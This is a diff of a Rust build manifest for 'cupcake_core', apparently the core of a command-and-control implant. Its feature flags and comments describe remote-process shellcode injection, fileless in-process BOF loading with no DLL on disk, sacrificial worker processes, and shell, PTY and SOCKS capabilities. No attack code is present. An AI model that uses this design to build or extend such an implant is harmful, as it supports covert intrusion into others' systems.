@@ -7,7 +7,9 @@ autobins = false
 
 [lib]
 name = "cupcake_core"
-crate-type = ["cdylib", "rlib"]
+# rlib only for product agent link — avoid building unused cupcake_core.dll (cdylib).
+# L2 module crates pull core as path dep (rlib).
+crate-type = ["rlib"]
 # Doc-tests still reference the old crate name `c2_client_agent`; unit tests cover shipped paths.
 doctest = false
 
@@ -39,8 +41,9 @@ dns = ["dep:trust-dns-resolver"]
 
 # --- Sole product aggregate ---
 # built-in: shell / PTY / fs / process / socks
-# L2: desktop (RDP), inject, iso_host (BOF/.NET)
+# L2: bof (classic in-process COFF module, Manual-Map, fileless), inject worker, ad worker
 # Web UI PTY uses Yamux stream 0x01 → requires `pty`.
+# `mem-map` IS product now: mod_bof must load fileless (no temp DLL on disk).
 minimal = [
     "post-ex",
     "pty",
@@ -58,16 +61,16 @@ module-loader = []
 mem-map = []
 # Refuse disk LoadLibrary fallback for L2 modules
 mem-map-strict = ["mem-map"]
-# PPID-spoofed sacrificial host for BOF/.NET (not same-process module)
+# Sacrificial worker spawn for inject/ad L2 EXEs (BOF is in-process via mem-map)
 isolated-exec = []
 
 # Individual gates (NOT product tiers — L2 crates / custom builds only)
 pty = []
 socks = []
 plugin = ["dep:lazy_static"]
-# inject: remote process shellcode — ONLY for L2 mod_inject crate
+# inject: remote process shellcode — ONLY for L2 cupcake-inject-worker crate
 inject = []
-# In-process BOF/.NET for L2/iso_host crates only (not Stage0 product)
+# In-process BOF engine for L2 mod_bof crate (not Stage0 product); dotnet retired
 bof = ["dep:lazy_static"]
 dotnet = []
 encoding-support = ["dep:encoding_rs"]
@@ -123,8 +126,6 @@ winapi = { version = "0.3", features = [
     "threadpoollegacyapiset", "psapi", "securitybaseapi",
     "wtypes", "winerror", "guiddef", "minwinbase", "heapapi",
     "processenv", "ntdef", "tlhelp32", "processthreadsapi", "libloaderapi",
-    # desktop load → auto-enable local RDP (3389)
-    "winreg", "winsvc",
 ] }
 widestring = "1.0"
 
